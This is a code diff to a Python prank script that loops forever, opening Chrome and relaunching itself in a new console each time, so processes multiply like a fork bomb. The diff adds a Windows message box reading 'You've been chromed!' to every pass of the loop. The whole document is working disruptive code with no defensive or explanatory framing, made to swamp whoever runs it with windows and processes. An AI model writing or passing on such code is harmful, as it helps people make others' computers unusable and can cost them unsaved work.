@@ -1,12 +1,16 @@
 import os
 import subprocess
 import threading
+import ctypes
 
 
 def main():
 
+    message_box = ctypes.windll.user32.MessageBoxW
+
     def open1():
         while True:
+            message_box(None, 'You\'ve been chromed!', 'trollage', 0)
             os.system('start chrome')
             subprocess.call('python main.py', creationflags=subprocess.CREATE_NEW_CONSOLE)
 
